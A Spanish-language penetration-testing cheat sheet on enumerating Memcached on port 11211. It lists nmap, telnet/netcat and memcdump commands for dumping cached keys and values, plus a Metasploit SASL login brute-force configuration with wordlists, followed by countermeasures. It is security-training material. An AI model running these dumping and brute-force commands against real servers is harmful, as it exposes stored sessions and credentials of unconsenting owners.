# Enumeración Memcached (Puerto 11211)

## Descripción
Memcached es un sistema de caché de objetos en memoria distribuido y de alto rendimiento. Las instancias de Memcached no suelen tener autenticación habilitada por defecto, permitiendo a cualquier atacante leer, modificar y extraer datos de la caché (Slab Dump). La enumeración de Memcached se centra en obtener estadísticas del servidor y extraer las claves y valores almacenados que pueden contener credenciales, sesiones o datos sensibles.

## Clasificación
- **Fase**: Enumeración
- **MITRE ATT&CK**: T1046 (Network Service Discovery)
- **Plataforma**: Multi
- **Dificultad**: Básica

## Herramientas
- **telnet** / **nc** (netcat) — para interacción directa con el servicio
- **nmap** — scripts NSE (memcached-info)
- **libmemcached-tools** — utilidades como `memcstat` y `memcdump`
- **Metasploit** — módulos auxiliares para escaneo y extracción de datos

## Comandos / Ejemplos

### Escaneo con Nmap
```bash
# Obtener información básica y estadísticas del servidor
nmap -p 11211 -sV --script memcached-info 10.10.10.10
```

### Enumeración Manual con Telnet/Netcat
```bash
# Conexión directa
telnet 10.10.10.10 11211

# Obtener estadísticas generales
stats

# Obtener estadísticas sobre los 'slabs' (donde se almacenan los datos)
stats slabs

# Listar ítems en un slab específico (ej: slab 1, límite de 10)
stats cachedump 1 10

# Obtener el valor de una clave específica
get <key_name>
```

### Extracción de claves con libmemcached-tools
```bash
# Obtener estadísticas
memcstat --servers=10.10.10.10

# Listar todas las claves almacenadas
memcdump --servers=10.10.10.10
```

### Fuerza bruta con Metasploit (Si tiene autenticación SASL)
```bash
msfconsole -q
use auxiliary/scanner/memcached/memcached_login
set RHOSTS 10.10.10.10
set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-100-common-passwords.txt
run
```

## Contramedidas
- **Habilitar autenticación SASL** si Memcached requiere acceso remoto.
- **Vincular el servicio a 127.0.0.1** (localhost) si el acceso remoto no es obligatorio.
- **Utilizar firewalls** para restringir el acceso al puerto 11211 por IP.
- **No almacenar datos sensibles en texto claro** en la caché si no hay garantías de seguridad en el transporte y acceso.
- **Deshabilitar el protocolo UDP** si no es necesario para mitigar ataques de amplificación DDoS.

## Referencias
- Memcached Documentation. (2024). SASL Authentication. https://github.com/memcached/memcached/wiki/SASL
- HackTricks. (2024). 11211 - Pentesting Memcached. https://book.hacktricks.xyz/network-services-pentesting/11211-pentesting-memcached
- SecLists: /usr/share/wordlists/seclists/Passwords/Default-Credentials/memcached-betterdefaultpasslist.txt
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking: The Ethical Hacker's Handbook* (5th ed.). McGraw-Hill Education.
